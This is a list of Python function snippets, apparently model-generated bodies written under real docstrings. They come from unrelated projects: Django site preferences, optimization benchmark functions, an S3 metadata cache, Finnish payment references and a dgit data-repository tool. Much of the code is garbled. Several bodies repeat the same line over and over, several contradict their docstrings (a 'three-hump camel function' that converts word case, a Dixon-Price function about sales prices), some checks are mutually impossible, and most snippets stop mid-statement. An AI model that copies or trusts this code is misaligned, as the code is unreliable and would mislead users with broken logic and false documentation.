        "def bind_preferences(values, category, field, verbose_name, help_text,\n                      static=False, readonly=False):\n    \"\"\"\n    Binds PrefProxy objects to module variables used by apps as preferences.\n\n    :param list|tuple values: Preference values.\n\n    :param str|unicode category: Category name the preference belongs to.\n\n    :param Field field: Django model field to represent this preference.\n\n    :param str|unicode verbose_name: Field verbose name.\n\n    :param str|unicode help_text: Field help text.\n\n    :param bool static: Leave this preference static (do not store in DB).\n\n    :param bool readonly: Make this field read only.\n\n    :rtype: list\n    \"\"\"\n    if static:\n        return values\n\n    if readonly:\n        return [\n            PrefProxy(\n                value=",
        "def register_admin_preferences(admin_site):\n    \"\"\"\n    Registers dynamically created preferences models for Admin interface.\n\n    :param admin.AdminSite admin_site: AdminSite object.\n    \"\"\"\n    from .models import (\n        UserPreference,\n        GroupPreference,\n        PermissionPreference,\n        PermissionPreferenceGroup,\n        PermissionPreferenceGroupPermission,\n        PermissionPreferenceGroupPermissionPermission,\n        PermissionPreference,\n        PermissionPreferenceGroupPermissionPermission,\n        PermissionPreference,\n        PermissionPreferenceGroupPermissionPermission,\n        PermissionPreferenceGroupPermissionPermission,\n        PermissionPreference,\n        PermissionPreferenceGroupPermissionPermission,\n        PermissionPreferenceGroupPermissionPermission,\n        PermissionPreference,\n        PermissionPreferenceGroupPermissionPermission,\n        PermissionPreferenceGroupPermissionPermission,\n        PermissionPreference,\n        PermissionPreferenceGroupPermissionPermission,\n        PermissionPreferenceGroupPermissionPermission,\n        PermissionPreference,\n        PermissionPreferenceGroupPermissionPermission",
        "def register_preferences(admin_site):\n    \"\"\"\n    Automatically discovers and registers all preferences available in all apps.\n\n    :param admin.AdminSite admin_site: Custom AdminSite object.\n    \"\"\"\n    from django.conf import settings\n    from django.contrib.admin.sites import AdminSite\n\n    for app in settings.INSTALLED_APPS:\n        try:\n            admin_site.register(\n                app,\n                PreferencesAdmin,\n                url=r'^preferences/$',\n                name=app,\n            )\n        except ImproperlyConfigured:\n            pass",
        "def restore_module_variables(module):\n    \"\"\"\n    Restores the original values of module variables\n    considered preferences if they are still PatchedLocal\n    and not PrefProxy.\n    \"\"\"\n    for key in dir(module):\n        if key.startswith('_'):\n            continue\n        if key.startswith('_' + PrefProxy.__name__):\n            continue\n        setattr(module, key, getattr(PrefProxy, key))",
        "def settings_module(depth=0):\n    \"\"\"Replaces a settings module with a Module proxy to intercept\n    an access to settings.\n\n    :param int depth: Frame count to go backward.\n    \"\"\"\n    def _settings_module(self, *args, **kwargs):\n        if depth > 0:\n            self.logger.debug(\"Setting up settings module\")\n        self.logger.debug(\"Setting up settings module\")\n        return self.settings.get_module()\n    return _settings_module",
        "def register_preferences(*args, **kwargs):\n    \"\"\"\n    Registers preferences that should be handled by siteprefs.\n\n    Expects preferences as *args.\n\n    Use keyword arguments to batch apply params supported by\n    ``PrefProxy`` to all preferences not constructed by ``pref`` and ``pref_group``.\n\n    Batch kwargs:\n\n        :param str|unicode help_text: Field help text.\n\n        :param bool static: Leave this preference static (do not store in DB).\n\n        :param bool readonly: Make this field read only.\n\n    :param bool swap_settings_module: Whether to automatically replace settings module\n        with a special ``ProxyModule`` object to access dynamic values of settings\n        transparently (so not to bother with calling ``.value`` of ``PrefProxy`` object).\n    \"\"\"\n    for pref in args:\n        if isinstance(pref",
        "def group(title, prefs, help_text=None, static=False, readonly=False):\n    \"\"\"Marks preferences group.\n\n    :param str|unicode title: Group title\n\n    :param list|tuple prefs: Preferences to group.\n\n    :param str|unicode help_text: Field help text.\n\n    :param bool static: Leave this preference static (do not store in DB).\n\n    :param bool readonly: Make this field read only.\n    \"\"\"\n    if static:\n        return _set_static(title, prefs, readonly)\n    else:\n        return _set_read_only(title, prefs, readonly)",
        "def mark_preference(\n    preference, field, verbose_name, help_text, static=False, readonly=False\n):\n    \"\"\"\n    Marks a preference.\n\n    :param preference: Preference variable.\n\n    :param Field field: Django model field to represent this preference.\n\n    :param str|unicode verbose_name: Field verbose name.\n\n    :param str|unicode help_text: Field help text.\n\n    :param bool static: Leave this preference static (do not store in DB).\n\n    :param bool readonly: Make this field read only.\n\n    :rtype: PrefProxy|None\n    \"\"\"\n    if static:\n        return\n\n    if readonly:\n        return\n\n    if field.verbose_name != verbose_name:\n        raise ValueError(\n            u'Field \"{0}\" must have the same verbose name as \"{1}\"'.",
        "def generate_versionwarning_data():\n    \"\"\"Generate the ``versionwarning-data.json`` file.\n\n    This file is included in the output and read by the AJAX request when\n    accessing to the documentation and used to compare the live versions with\n    the curent one.\n\n    Besides, this file contains meta data about the project, the API to use and\n    the banner itself.\n    \"\"\"\n    data = {\n        'api_version': get_api_version(),\n        'banner': get_banner(),\n    }\n    return json.dumps(data)",
        "def objective_function(param_scales, xstar):\n    \"\"\"\n    Gives objective functions a number of dimensions and parameter range\n\n    Parameters\n    ----------\n    param_scales : (int, int)\n        Scale (std. dev.) for choosing each parameter\n\n    xstar : array_like\n        Optimal parameters\n    \"\"\"\n    # Get parameter range\n    param_range = np.linspace(0, 1, param_scales)\n    # Get parameter range\n    xstar = np.asarray(xstar)\n    # Get parameter range\n    xstar = xstar[param_range]\n    # Get parameter range\n    xstar = xstar[param_range]\n    # Get parameter range\n    xstar = xstar[param_range]\n    # Get parameter range\n    xstar = xstar[param_range]\n    #",
        "def min(a, b):\n    \"\"\"Pointwise minimum of two quadratic bowls\"\"\"\n    return np.min(a, axis=0, out=b)",
        "def rosenbrock_objective_gradient(self, X, y, **kwargs):\n        \"\"\"\n        Objective and gradient for the rosenbrock function\n        \"\"\"\n        return self.objective_gradient(X, y, **kwargs)",
        "def beale(self, x, y, z, theta, phi, theta_phi, theta_theta, phi_phi, phi_theta, theta_phi_phi, phi_theta_phi, theta_phi_phi_phi, phi_theta_phi_phi_phi, theta_phi_phi_phi_phi_phi, phi_theta_phi_phi_phi_phi_phi, theta_phi_phi_phi_phi_phi_phi_phi, theta_phi_phi_phi_phi_phi_phi_phi_phi, theta_phi_phi_phi_phi_phi_phi_phi_phi_phi, theta_phi_phi_phi_phi_phi_phi_phi_phi_phi, theta_phi_phi_phi_phi_phi_phi_phi_phi_phi, theta_phi_phi_phi_phi_phi_phi_phi_",
        "def _smooth(self, x, y, sigma):\n        \"\"\"Booth's function\"\"\"\n        return (x - self.start_x) * (y - self.start_y) + (x + self.end_x) * (y + self.end_y) + sigma * (x - self.start_x)",
        "def camel(word):\n    \"\"\"Three-hump camel function\"\"\"\n    word = word.lower()\n    word = re.sub(r'(.)([A-Z])', r'\\1_\\2', word)\n    word = re.sub(r'([a-z])([A-Z])', r'\\1_\\2', word)\n    word = re.sub(r'([A-Z])([A-Z])', r'\\1_\\2', word)\n    word = re.sub(r'([a-z])([A-Z])', r'\\1_\\2', word)\n    word = re.sub(r'([a-z])([A-Z])', r'\\1_\\2', word)\n    word = re.sub(r'([a-z])([A-Z])', r'\\1_\\2', word)\n    word =",
        "def _bohachevsky(self, x, y, z, theta, phi, theta_phi, phi_phi, theta_theta, phi_theta, theta_phi_theta, phi_theta_theta, theta_theta_phi_theta, phi_theta_phi_theta_theta, phi_theta_theta_phi_theta_theta, phi_theta_phi_theta_theta_theta, phi_theta_phi_theta_theta_theta_theta, phi_theta_phi_theta_theta_theta_theta, phi_theta_phi_theta_theta_theta_theta_theta, phi_theta_phi_theta_theta_theta_theta_theta, phi_theta_phi_theta_theta_theta_theta_theta, phi_theta_phi_theta_theta_theta_theta_theta, phi_theta_phi_theta_theta_theta_theta_theta,",
        "def dixon_price(self, price, price_type, **kwargs):\n        \"\"\"Dixon-Price function\"\"\"\n        if price_type == 'percent':\n            return self.dixon_price_percent(price, **kwargs)\n        elif price_type == 'percent_of_sales':\n            return self.dixon_price_percent_of_sales(price, **kwargs)\n        elif price_type == 'sales':\n            return self.dixon_price_sales(price, **kwargs)\n        elif price_type == 'total':\n            return self.dixon_price_total(price, **kwargs)\n        else:\n            raise ValueError('Invalid price type: {}'.format(price_type))",
        "def styblinski_tang(x, y, z, theta, phi, theta_rad, phi_rad, theta_deg, phi_deg, theta_deg_rad, phi_deg_rad_rad):\n    \"\"\"Styblinski-Tang function\"\"\"\n    theta_rad = np.radians(theta)\n    phi_rad = np.radians(phi)\n    theta_deg = np.radians(theta_deg)\n    phi_deg = np.radians(phi_deg)\n    theta_deg_rad = np.radians(theta_deg_rad)\n    phi_deg_rad_rad = np.radians(phi_deg_rad_rad)\n    theta_rad_rad_rad = np.radians(theta_rad_rad_rad)\n    theta_deg_rad_rad_rad = np.radians",
        "def list_buckets(self, force=False):\n        \"\"\"Return a list of buckets in MimicDB.\n\n        :param boolean force: If true, API call is forced to S3\n        \"\"\"\n        if force:\n            return self.s3_client.list_buckets()\n        else:\n            return self.s3_client.list_buckets_with_prefix(self.bucket_prefix)",
        "def get_bucket(self, force=False):\n        \"\"\"Return a bucket from MimicDB if it exists. Return a\n        S3ResponseError if the bucket does not exist and validate is passed.\n\n        :param boolean force: If true, API call is forced to S3\n        \"\"\"\n        if not force:\n            try:\n                self.s3.get_bucket(Bucket=self.bucket_name)\n            except ClientError as e:\n                if e.response['Error']['Code'] == 'NoSuchBucket':\n                    return None\n                raise\n        return self.bucket_name",
        "def add_bucket(self, bucket):\n        \"\"\"Add the bucket to MimicDB after successful creation.\"\"\"\n        self.mimicdb.add_bucket(bucket)\n        self.mimicdb.add_bucket_to_cache(bucket)",
        "def sync(self, *buckets):\n        \"\"\"Sync either a list of buckets or the entire connection.\n\n        Force all API calls to S3 and populate the database with the current\n        state of S3.\n\n        :param \\*string \\*buckets: Buckets to sync\n        \"\"\"\n        if not buckets:\n            return\n        for bucket in buckets:\n            self.sync_bucket(bucket)",
        "def key(self, force=False):\n        \"\"\"Return the key from MimicDB.\n\n        :param boolean force: If true, API call is forced to S3\n        \"\"\"\n        if not force:\n            return self._key\n        self._key = self._get_key()\n        return self._key",
        "def _check_key(self, key, force=False):\n        \"\"\"Return None if key is not in the bucket set.\n\n        Pass 'force' in the headers to check S3 for the key, and after fetching\n        the key from S3, save the metadata and key to the bucket set.\n        \"\"\"\n        if force or key not in self.bucket_set:\n            self.bucket_set.add(key)\n            self.metadata[key] = key\n            return key",
        "def keys(self, force=False):\n        \"\"\"Return a list of keys from MimicDB.\n\n        :param boolean force: If true, API call is forced to S3\n        \"\"\"\n        if force:\n            return self.s3.list_objects(Bucket=self.bucket, Prefix=self.key)\n        else:\n            return self.s3.list_objects(Bucket=self.bucket, Prefix=self.key)",
        "def delete_keys(self, keys):\n        \"\"\"Remove each key or key name in an iterable from the bucket set.\"\"\"\n        for key in keys:\n            self.delete(key)",
        "def delete(self, key):\n        \"\"\"Remove key name from bucket set.\"\"\"\n        self.s3.delete_bucket(Bucket=self.bucket, Key=key)",
        "def keys(self, force=False):\n        \"\"\"Return an iterable of keys from MimicDB.\n\n        :param boolean force: If true, API call is forced to S3\n        \"\"\"\n        if force:\n            return self.s3.keys(Bucket=self.bucket, Prefix=self.prefix)\n        else:\n            return self.s3.keys(Bucket=self.bucket, Prefix=self.prefix,\n                                   PrefixPattern=self.prefix_pattern)",
        "def sync_bucket(self, bucket_name):\n        \"\"\"Sync a bucket.\n\n        Force all API calls to S3 and populate the database with the current state of S3.\n        \"\"\"\n        self.s3.sync_bucket(Bucket=bucket_name)\n        self.populate_db()",
        "def lbfgs(f_df, maxiter=1000):\n    \"\"\"Minimize the proximal operator of a given objective using L-BFGS\n\n    Parameters\n    ----------\n    f_df : function\n        Returns the objective and gradient of the function to minimize\n\n    maxiter : int\n        Maximum number of L-BFGS iterations\n    \"\"\"\n    f_df = f_df.copy()\n    f_df = f_df.reshape((-1, 1))\n    f_df = f_df.reshape((-1, 1))\n    f_df = f_df.reshape((-1, 1))\n    f_df = f_df.reshape((-1, 1))\n    f_df = f_df.reshape((-1, 1))\n    f_df = f_df.reshape((-1, 1))\n   ",
        "def smooth(penalty, axis=0, newshape=None):\n    \"\"\"Applies a smoothing operator along one dimension\n\n    currently only accepts a matrix as input\n\n    Parameters\n    ----------\n    penalty : float\n\n    axis : int, optional\n        Axis along which to apply the smoothing (Default: 0)\n\n    newshape : tuple, optional\n        Desired shape of the parameters to apply the nuclear norm to. The given\n        parameters are reshaped to an array with this shape, or not reshaped if\n        the value of newshape is None. (Default: None)\n    \"\"\"\n    if newshape is None:\n        newshape = (1,)\n    if axis < 0:\n        axis = len(newshape) - axis\n    if axis < 0:\n        raise ValueError('axis must be >= 0')\n    if axis > len(newshape):\n       ",
        "def projection(self, x, y, z):\n        \"\"\"Projection onto the semidefinite cone\"\"\"\n        return np.array([[x, y, z],\n                         [x, y, z],\n                         [x, y, z],\n                         [x, y, z],\n                         [x, y, z],\n                         [x, y, z],\n                         [x, y, z],\n                         [x, y, z],\n                         [x, y, z],\n                         [x, y, z],\n                         [x, y, z],\n                         [x, y, z],\n                         [x, y, z],\n                         [x, y, z],\n                         [x, y, z],\n                         [x, y, z],\n                         [x, y, z],\n                         [x, y, z],\n                         [x, y, z",
        "def _simplex_projection(x, y, weights):\n    \"\"\"Projection onto the probability simplex\n\n    http://arxiv.org/pdf/1309.1541v1.pdf\n    \"\"\"\n    return np.exp(weights * np.log(y) - weights * np.log(x))",
        "def proximal_col_operator(self, operator, *args):\n        \"\"\"Applies a proximal operator to the columns of a matrix\"\"\"\n        return self.apply_proximal_operator(operator, self.col_indices, *args)",
        "def _make_optimizer(self, coro):\n        \"\"\"Turns a coroutine into a gradient based optimizer.\"\"\"\n        if self.optimizer is None:\n            self.optimizer = GradientBasedOptimizer(self.optimizer_params)\n        return self.optimizer.make_optimizer(coro)",
        "def add_proximal_operator(self, proximal_operator):\n        \"\"\"Adds a proximal operator to the list of operators\"\"\"\n        if proximal_operator.name not in self.proximal_operators:\n            self.proximal_operators.append(proximal_operator)",
        "def set_key_attributes(self, key, attributes):\n        \"\"\"Set key attributes to retrived metadata. Might be extended in the\n        future to support more attributes.\n        \"\"\"\n        if not isinstance(attributes, dict):\n            raise TypeError(\"attributes must be a dictionary\")\n        for attr in attributes:\n            if attr not in self.key_attributes:\n                raise KeyError(\"Unknown attribute %s\" % attr)\n            setattr(self, attr, attributes[attr])",
        "def _upload_key(self, key, bucket, metadata):\n        \"\"\"Called internally for any type of upload. After upload finishes,\n        make sure the key is in the bucket set and save the metadata.\n        \"\"\"\n        if key in self.bucket_set:\n            self.bucket_set.discard(key)\n            self.metadata[key] = metadata\n        else:\n            self.bucket_set.add(key)\n            self.metadata[key] = metadata",
        "def split_objective_and_gradient(f_df, xref, size=1):\n    \"\"\"\n    Memoizes an objective + gradient function, and splits it into\n    two functions that return just the objective and gradient, respectively.\n\n    Parameters\n    ----------\n    f_df : function\n        Must be unary (takes a single argument)\n\n    xref : list, dict, or array_like\n        The form of the parameters\n\n    size : int, optional\n        Size of the cache (Default=1)\n    \"\"\"\n    if isinstance(xref, (list, dict)):\n        xref = [xref]\n    if isinstance(xref, (tuple, list)):\n        xref = [x for x in xref]\n    if len(xref) != 2:\n        raise ValueError('xref must be a 2-tuple')\n    if len(xref) == 1:\n       ",
        "def doc(docstr):\n    \"\"\"Decorates a function with the given docstring\n\n    Parameters\n    ----------\n    docstr : string\n    \"\"\"\n    def decorator(func):\n        @wraps(func)\n        def wrapper(*args, **kwargs):\n            return func(*args, **kwargs).rstrip() + '\\n' + docstr\n        return wrapper\n    return decorator",
        "def check_gradients(f_df, x0, stepsize=1e-6, tol=1e-5, width=15, style='round'):\n    \"\"\"\n    Compares the numerical gradient to the analytic gradient\n\n    Parameters\n    ----------\n    f_df : function\n        The analytic objective and gradient function to check\n\n    x0 : array_like\n        Parameter values to check the gradient at\n\n    stepsize : float, optional\n        Stepsize for the numerical gradient. Too big and this will poorly estimate the gradient.\n        Too small and you will run into precision issues (default: 1e-6)\n\n    tol : float, optional\n        Tolerance to use when coloring correct/incorrect gradients (default: 1e-5)\n\n    width : int, optional\n        Width of the table columns (default: 15)",
        "def evaluate_files(self, files):\n        \"\"\"Evaluate the files identified for checksum.\"\"\"\n        for filename in files:\n            self.evaluate_file(filename)",
        "def check_datapackage_json(self):\n        \"\"\"Check the integrity of the datapackage.json\"\"\"\n        if not os.path.exists(self.datapackage_json):\n            raise DataPackageJsonError(\n                \"Datapackage.json does not exist: {}\".format(self.datapackage_json)\n            )\n        with open(self.datapackage_json) as f:\n            datapackage_json = json.load(f)\n        if not datapackage_json:\n            raise DataPackageJsonError(\n                \"Datapackage.json is empty: {}\".format(self.datapackage_json)\n            )\n        if not datapackage_json.get(\"version\"):\n            raise DataPackageJsonError(\n                \"Datapackage.json has no version: {}\".format(self.datapackage_json)\n            )\n        if not datapackage_json.",
        "def _read_file(self, filename):\n        \"\"\"Guess the filetype and read the file into row sets\"\"\"\n        filetype = self._guess_filetype(filename)\n        if filetype is None:\n            raise ValueError(\"Unknown filetype: %s\" % filename)\n        if filetype == 'csv':\n            return self._read_csv(filename)\n        elif filetype == 'tsv':\n            return self._read_tsv(filename)\n        else:\n            raise ValueError(\"Unknown filetype: %s\" % filetype)",
        "def guess_schema(self):\n        \"\"\"Guess schema using messytables\"\"\"\n        if self.schema is None:\n            self.schema = self.get_schema()\n        return self.schema",
        "def checksum_national_reference_number(national_reference_number):\n    \"\"\"Calculates a checksum for a Finnish national reference number\"\"\"\n    if national_reference_number is None:\n        return None\n    if len(national_reference_number) < 10:\n        raise ValueError(\"National reference number must be at least 10 digits long\")\n    if len(national_reference_number) > 10:\n        raise ValueError(\"National reference number must be at most 10 digits long\")\n    if len(national_reference_number) < 11:\n        raise ValueError(\"National reference number must be at least 11 digits long\")\n    if len(national_reference_number) > 11:\n        raise ValueError(\"National reference number must be at most 11 digits long\")\n    if len(national_reference_number) < 12:\n        raise ValueError(\"National reference number",
        "def _validate_reference_number_char(char):\n    \"\"\"Helper to make sure the given character is valid for a reference number\"\"\"\n    if char not in _REFERENCE_NUMBER_CHARS:\n        raise ValueError(\"Invalid reference number character: %s\" % char)\n    return char",
        "def create_huge_number(self, number):\n        \"\"\"Creates the huge number from ISO alphanumeric ISO reference\"\"\"\n        number = number.replace(' ', '')\n        number = number.replace('-', '')\n        number = number.replace('.', '')\n        number = number.replace('/', '')\n        number = number.replace(' ', '')\n        number = number.replace('-', '')\n        number = number.replace('.', '')\n        number = number.replace('/', '')\n        number = number.replace(' ', '')\n        number = number.replace('-', '')\n        number = number.replace('.', '')\n        number = number.replace('/', '')\n        number = number.replace(' ', '')\n        number = number.replace('-', '')\n        number = number.replace('.', '')\n        number = number.replace('/', '')",
        "def validate_iso(self, value):\n        \"\"\"Validates ISO reference number\"\"\"\n        if not value:\n            return\n        if not re.match(r'^[0-9]{4}$', value):\n            raise ValueError('Invalid ISO reference number')\n        if not re.match(r'^[0-9]{3}$', value):\n            raise ValueError('Invalid ISO reference number')\n        if not re.match(r'^[0-9]{2}$', value):\n            raise ValueError('Invalid ISO reference number')\n        if not re.match(r'^[0-9]{1}$', value):\n            raise ValueError('Invalid ISO reference number')",
        "def calculate_virtual_barcode(iban, reference, amount, due):\n    \"\"\"Calculates virtual barcode for IBAN account number and ISO reference\n\n    Arguments:\n        iban {string} -- IBAN formed account number\n        reference {string} -- ISO 11649 creditor reference\n        amount {decimal.Decimal} -- Amount in euros, 0.01 - 999999.99\n        due {datetime.date} -- due date\n    \"\"\"\n    if due is None:\n        due = datetime.date.today()\n    if due < datetime.date(1970, 1, 1):\n        raise ValueError(\"Due date is before 1970\")\n    if due > datetime.date(1970, 12, 31):\n        raise ValueError(\"Due date is after 1970\")\n    if due < datetime.date(1970, 12, 31):\n        due = due - datetime.date",
        "def add_normal_file(self, filename, source, encoding=None):\n        \"\"\"Add a normal file including its source\"\"\"\n        self.add_file(filename, source, encoding=encoding)",
        "def run(self, input_file, output_file, **kwargs):\n        \"\"\"Run the executable and capture the input and output...\"\"\"\n        self.input_file = input_file\n        self.output_file = output_file\n        self.kwargs = kwargs\n        self.run_command()",
        "def add_files(repo, args, targetdir, execute=False, includes=None,\n              script=False, generator=False, source=None):\n    \"\"\"\n    Add files to the repository by explicitly specifying them or by\n    specifying a pattern over files accessed during execution of an\n    executable.\n\n    Parameters\n    ----------\n\n    repo: Repository\n\n    args: files or command line\n         (a) If simply adding files, then the list of files that must\n         be added (including any additional arguments to be passed to\n         git\n         (b) If files to be added are an output of a command line, then\n         args is the command lined\n    targetdir: Target directory to store the files\n    execute: Args are not files to be added but scripts that must be run.\n    includes: patterns used to select files to\n    script: Is this a script?\n   ",
        "def _get_files(self, action):\n        \"\"\"For various actions we need files that match patterns\"\"\"\n        files = []\n        for pattern in self.patterns:\n            if fnmatch.fnmatch(action, pattern):\n                files.append(pattern)\n        return files",
        "def run_command(self, command, *args, **kwargs):\n        \"\"\"Run a specific command using the manager\"\"\"\n        return self.manager.run_command(command, *args, **kwargs)",
        "def get_metadata(self, filename):\n        \"\"\"Get metadata for a given file\"\"\"\n        if filename not in self.files:\n            raise IOError(\"File %s not found\" % filename)\n        return self.files[filename].metadata",
        "def _get_repos(self):\n        \"\"\"Lookup all available repos\"\"\"\n        repos = []\n        for repo in self.config.get('repositories', []):\n            repos.append(Repo(repo))\n        return repos",
        "def working_dir(self):\n        \"\"\"Working directory for the repo\"\"\"\n        if self._working_dir is None:\n            self._working_dir = os.path.join(self.repo_dir, self.name)\n        return self._working_dir",
        "def add_repo(self, repo):\n        \"\"\"Add repo to the internal lookup table...\"\"\"\n        if repo not in self.repos:\n            self.repos[repo] = []\n        self.repos[repo].append(repo)",
        "def get_repo(username, repo_name):\n    \"\"\"Lookup a repo based on username reponame\"\"\"\n    if username is None:\n        return None\n    if repo_name is None:\n        return None\n    return get_repo_by_name(username, repo_name)",
        "def run_command(repo, args):\n    \"\"\"Run a shell command within the repo's context\n\n    Parameters\n    ----------\n\n    repo: Repository object\n    args: Shell command\n    \"\"\"\n    try:\n        return repo.run_command(args)\n    except Exception as e:\n        raise CommandError(e)",
        "def _check_datapackage(self):\n        \"\"\"Check if the datapackage exists...\"\"\"\n        if not os.path.exists(self.datapackage):\n            raise DataPackageError(\"Data package %s does not exist\" % self.datapackage)",
        "def create_datapackage(self):\n        \"\"\"Create the datapackage file..\"\"\"\n        self.datapackage_path = self.datapackage_path + \".zip\"\n        self.datapackage_path = self.datapackage_path + \".tar.gz\"\n        self.datapackage_path = self.datapackage_path + \".tar.bz2\"\n        self.datapackage_path = self.datapackage_path + \".tar.xz\"\n        self.datapackage_path = self.datapackage_path + \".tar.gz\"\n        self.datapackage_path = self.datapackage_path + \".tar.bz2\"\n        self.datapackage_path = self.datapackage_path + \".tar.xz\"\n        self.datapackage_path = self.datapackage_path + \".tar.gz\"\n        self.datapackage_path = self",
        "def init_repo(username, reponame, setup='git', force=False, options=None, noinput=False):\n    \"\"\"\n    Initialize an empty repository with datapackage.json\n\n    Parameters\n    ----------\n\n    username: Name of the user\n    reponame: Name of the repo\n    setup: Specify the 'configuration' (git only, git+s3 backend etc)\n    force: Force creation of the files\n    options: Dictionary with content of dgit.json, if available.\n    noinput: Automatic operation with no human interaction\n    \"\"\"\n    if setup == 'git':\n        setup_git(username, reponame, force, options, noinput)\n    elif setup == 's3':\n        setup_s3(username, reponame, force, options, noinput)\n    else:\n        raise ValueError('Unsupported",
        "def update_metadata(self):\n        \"\"\"Update metadata with the content of the files\"\"\"\n        for filename in self.files:\n            if filename in self.metadata:\n                self.metadata[filename].update(self.files[filename])",
        "def update_metadata(self, commit_info):\n        \"\"\"Update metadata with the commit information\"\"\"\n        self.metadata.update(commit_info)\n        self.metadata.update({\n            'commit_id': commit_info.commit_id,\n            'commit_date': commit_info.commit_date,\n            'commit_hash': commit_info.commit_hash,\n            'commit_message': commit_info.commit_message,\n            'commit_author': commit_info.commit_author,\n            'commit_author_email': commit_info.commit_author_email,\n            'commit_author_name': commit_info.commit_author_name,\n            'commit_author_url': commit_info.commit_author_url,\n            'commit_author_time': commit_info.commit_author_time,\n            'commit_author",
        "def update_metadata(self, action_history):\n        \"\"\"Update metadata with the action history\"\"\"\n        self.metadata = {\n            'action_history': action_history,\n            'action_history_timestamp': time.time(),\n        }",
        "def update_metadata_host(self, host_id, metadata):\n        \"\"\"Update metadata host information\"\"\"\n        return self.put(self.metadata_host_path % (host_id), data=metadata)",
        "def _collect_repo_info(self):\n        \"\"\"Collect information from the dependent repo's\"\"\"\n        if self.repo_name:\n            self.repo_info = self.repo.info(self.repo_name)\n        else:\n            self.repo_info = self.repo.info()",
        "def post_metadata(repo):\n    \"\"\"Post to metadata server\n\n    Parameters\n    ----------\n\n    repo: Repository object (result of lookup)\n    \"\"\"\n    # TODO: make this a method of the repo object\n    # TODO: make this a method of the metadata object\n    # TODO: make this a method of the metadata object\n    # TODO: make this a method of the metadata object\n    # TODO: make this a method of the metadata object\n    # TODO: make this a method of the metadata object\n    # TODO: make this a method of the metadata object\n    # TODO: make this a method of the metadata object\n    # TODO: make this a method of the metadata object\n    # TODO: make this a method of the metadata object\n    # TODO: make this a method of the metadata object\n    # TODO: make this a method of the metadata object\n    # TODO: make",
        "def show_plugin(what, name, version, details=False):\n    \"\"\"\n    Show details of available plugins\n\n    Parameters\n    ----------\n    what: Class of plugins e.g., backend\n    name: Name of the plugin e.g., s3\n    version: Version of the plugin\n    details: Show details be shown?\n    \"\"\"\n    plugins = get_plugins(what)\n    if details:\n        print(\"{0} {1} {2}\".format(what, name, version))\n    else:\n        print(\"{0} {1}\".format(what, name))",
        "def load_plugins(self):\n        \"\"\"Load all plugins from dgit extension\"\"\"\n        for ext in self.extensions:\n            if ext.name == 'dgit':\n                self.load_dgit_extension(ext)",
        "def register(self, what, obj):\n        \"\"\"\n        Registering a plugin\n\n        Params\n        ------\n        what: Nature of the plugin (backend, instrumentation, repo)\n        obj: Instance of the plugin\n        \"\"\"\n        if what not in self.plugins:\n            self.plugins[what] = []\n        self.plugins[what].append(obj)",
        "def find_plugin(self, name):\n        \"\"\"Search for a plugin\"\"\"\n        for plugin in self.plugins:\n            if plugin.name == name:\n                return plugin\n        return None",
        "def _instantiate_validation_spec(self, spec):\n        \"\"\"Instantiate the validation specification\"\"\"\n        if spec is None:\n            spec = self.validation_spec\n        if spec is None:\n            raise ValueError(\"Validation specification is None\")\n        if not isinstance(spec, ValidationSpec):\n            raise TypeError(\"Validation specification must be a ValidationSpec\")\n        return spec",
        "def validate(repo, validator_name=None, filename=None, rules=None, show=True):\n    \"\"\"\n    Validate the content of the files for consistency. Validators can\n    look as deeply as needed into the files. dgit treats them all as\n    black boxes.\n\n    Parameters\n    ----------\n\n    repo: Repository object\n    validator_name: Name of validator, if any. If none, then all validators specified in dgit.json will be included.\n    filename: Pattern that specifies files that must be processed by the validators selected. If none, then the default specification in dgit.json is used.\n    rules: Pattern specifying the files that have rules that validators will use\n    show: Print the validation results on the terminal\n\n    Returns\n    -------\n\n    status: A list of dictionaries, each with target file processed, rules file applied, status of the validation and any",
        "def url_exists(self, url):\n        \"\"\"Check if a URL exists\"\"\"\n        if self.is_url(url):\n            return True\n        if self.is_file(url):\n            return True\n        return False",
        "def post(self, repo):\n        \"\"\"\n        Post to the metadata server\n\n        Parameters\n        ----------\n\n        repo\n        \"\"\"\n        if not self.is_open:\n            raise IOError(\"Metadata server is closed\")\n        if not self.is_open:\n            raise IOError(\"Metadata server is closed\")\n        if not self.is_open:\n            raise IOError(\"Metadata server is closed\")\n        if not self.is_open:\n            raise IOError(\"Metadata server is closed\")\n        if not self.is_open:\n            raise IOError(\"Metadata server is closed\")\n        if not self.is_open:\n            raise IOError(\"Metadata server is closed\")\n        if not self.is_open:\n            raise IOError(\"Metadata server is closed\")\n        if not self.is_open:\n            raise IOError(\"Metadata server is closed\")\n        if not self.is",
        "def import_class(path_to_class):\n    \"\"\"\n    imports and returns module class from ``path.to.module.Class``\n    argument\n    \"\"\"\n    path_to_module = path_to_class.split('.')\n    module = __import__(path_to_module[0])\n    return getattr(module, path_to_module[1])",
        "def _find_executables(self):\n        \"\"\"Find max 5 executables that are responsible for this repo.\"\"\"\n        executables = []\n        for path in self.paths:\n            for entry in os.listdir(path):\n                if entry.endswith('.exe'):\n                    executables.append(entry)\n        return executables",
        "def get_repo(autooptions):\n    \"\"\"\n    Automatically get repo\n\n    Parameters\n    ----------\n\n    autooptions: dgit.json content\n    \"\"\"\n    repo = None\n    try:\n        repo = dgit.Repo(autooptions)\n    except dgit.errors.RepoError as e:\n        print(e)\n        sys.exit(1)\n    return repo",
        "def _get_files(self):\n        \"\"\"Look through the local directory to pick up files to check\"\"\"\n        files = []\n        for root, dirs, files in os.walk(self.local_dir):\n            for filename in files:\n                if filename.endswith('.py'):\n                    files.remove(filename)\n        return files",
        "def add_path(self, path):\n        \"\"\"Cleanup the paths and add\"\"\"\n        if path in self.paths:\n            self.paths.remove(path)\n        self.paths.append(path)",
        "def _get_config(self, config_file):\n        \"\"\"\n        Get the config from a file.\n        \"\"\"\n        config = self._get_config_from_file(config_file)\n        if config is None:\n            raise ConfigError(\"No config file found at %s\" % config_file)\n        return config",
        "def record(\n            self,\n            localStreamName,\n            pathToFile,\n            type,\n            overwrite=0,\n            keepAlive=0,\n            chunkLength=0,\n            waitForIDR=0,\n            winQtCompat=0,\n            dateFolderStructure=0,\n            winQtVersion=0,\n            waitForFile=0,\n            waitForFileStructure=0,\n            waitForFileSync=0,\n            waitForFileSyncStructure=0,\n            waitForFileSyncTime=0,\n            waitForFileSyncTimeStructure=0,\n            waitForFileSyncTime=0,\n            waitForFileSyncTimeStructure=0,\n            waitForFileSyncTime=0,\n            waitForFileSyncTimeStructure=0,\n            waitForFileSyncTime=0,\n            waitForFileSyncTimeStructure=0,\n            waitForFileSyncTime=0,\n            waitForFileSyncTime=0,\n",
